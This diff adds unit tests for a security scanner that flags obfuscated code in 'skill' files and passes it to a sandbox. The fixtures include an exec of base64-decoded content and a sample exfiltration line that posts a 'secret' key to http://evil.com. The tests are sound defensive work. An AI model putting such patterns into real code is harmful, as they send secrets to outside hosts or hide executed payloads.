@@ -243,3 +243,124 @@ def encode_data(data):
         result = scan_skill(content=content)
         # Docstring examples in quotes don't trigger the regex pattern
         assert not any(f.pattern_id == "SP-009" for f in result.findings)
+
+
+# ---------------------------------------------------------------------------
+# Sandbox integration path (lines 288-313 in security_scan.py)
+# ---------------------------------------------------------------------------
+
+
+class TestSandboxIntegration:
+    """Cover the sandbox-triggered path when SP-009 (obfuscation) is found."""
+
+    def test_sandbox_path_triggered_for_sp009_with_env_access(self, tmp_path):
+        """When SP-009 found + sandbox_mode != 'none', sandbox is invoked.
+        If sandbox result is suspicious, SB-001 finding is added.
+        """
+        from unittest.mock import patch, MagicMock
+
+        skill_file = tmp_path / "malicious.py"
+        # Content that triggers SP-009 (obfuscation)
+        content = 'import base64\nexec(base64.b64decode("aW1wb3J0IG9z"))'
+        skill_file.write_text(content)
+
+        mock_sandbox_result = MagicMock()
+        mock_sandbox_result.is_suspicious = True
+        mock_sandbox_result.timed_out = False
+        mock_sandbox_result.env_vars_accessed = ["AWS_SECRET_ACCESS_KEY"]
+
+        with patch("sandbox.sandbox_run", return_value=mock_sandbox_result) as mock_sandbox:
+            result = scan_skill(
+                content=content,
+                skill_path=skill_file,
+                sandbox_mode="subprocess",
+            )
+
+        mock_sandbox.assert_called_once_with(skill_file, mode="subprocess")
+        # SP-009 (or SP-009.x) should be present
+        pattern_ids = [f.pattern_id for f in result.findings]
+        assert any(pid.startswith("SP-009") for pid in pattern_ids)
+        # SB-001 should be added (env vars accessed in sandbox)
+        assert "SB-001" in pattern_ids
+
+    def test_sandbox_path_triggered_for_sp009_timeout(self, tmp_path):
+        """Sandbox timeout → SB-002 finding added."""
+        from unittest.mock import patch, MagicMock
+
+        skill_file = tmp_path / "timeout_skill.py"
+        content = 'import base64\nexec(base64.b64decode("aW1wb3J0IG9z"))'
+        skill_file.write_text(content)
+
+        mock_sandbox_result = MagicMock()
+        mock_sandbox_result.is_suspicious = False
+        mock_sandbox_result.timed_out = True
+        mock_sandbox_result.env_vars_accessed = []
+
+        with patch("sandbox.sandbox_run", return_value=mock_sandbox_result):
+            result = scan_skill(
+                content=content,
+                skill_path=skill_file,
+                sandbox_mode="subprocess",
+            )
+
+        pattern_ids = [f.pattern_id for f in result.findings]
+        assert "SB-002" in pattern_ids
+
+    def test_sandbox_not_called_when_mode_is_none(self, tmp_path):
+        """When sandbox_mode='none', sandbox_run is never called."""
+        from unittest.mock import patch
+
+        skill_file = tmp_path / "obfuscated.py"
+        content = 'import base64\nexec(base64.b64decode("aW1wb3J0IG9z"))'
+        skill_file.write_text(content)
+
+        with patch("sandbox.sandbox_run") as mock_sandbox:
+            scan_skill(
+                content=content,
+                skill_path=skill_file,
+                sandbox_mode="none",
+            )
+
+        mock_sandbox.assert_not_called()
+
+    def test_sandbox_not_called_when_no_sp009(self, tmp_path):
+        """Without SP-009 finding, sandbox is not invoked even in subprocess mode."""
+        from unittest.mock import patch
+
+        skill_file = tmp_path / "clean.py"
+        # RED finding but NOT SP-009 (e.g., SP-001 exfiltration)
+        content = "import requests\nrequests.post('http://evil.com', data={'key': 'secret'})"
+
+        with patch("sandbox.sandbox_run") as mock_sandbox:
+            scan_skill(
+                content=content,
+                skill_path=skill_file,
+                sandbox_mode="subprocess",
+            )
+
+        mock_sandbox.assert_not_called()
+
+    def test_sandbox_clean_result_sets_passed_sandbox_true(self, tmp_path):
+        """When sandbox result is not suspicious and not timed out, passed_sandbox=True."""
+        from unittest.mock import patch, MagicMock
+
+        skill_file = tmp_path / "obfuscated_clean.py"
+        content = 'import base64\nexec(base64.b64decode("aW1wb3J0IG9z"))'
+        skill_file.write_text(content)
+
+        mock_sandbox_result = MagicMock()
+        mock_sandbox_result.is_suspicious = False
+        mock_sandbox_result.timed_out = False
+        mock_sandbox_result.env_vars_accessed = []
+
+        with patch("sandbox.sandbox_run", return_value=mock_sandbox_result):
+            result = scan_skill(
+                content=content,
+                skill_path=skill_file,
+                sandbox_mode="subprocess",
+            )
+
+        assert result.passed_sandbox is True
+        pattern_ids = [f.pattern_id for f in result.findings]
+        assert "SB-001" not in pattern_ids
+        assert "SB-002" not in pattern_ids
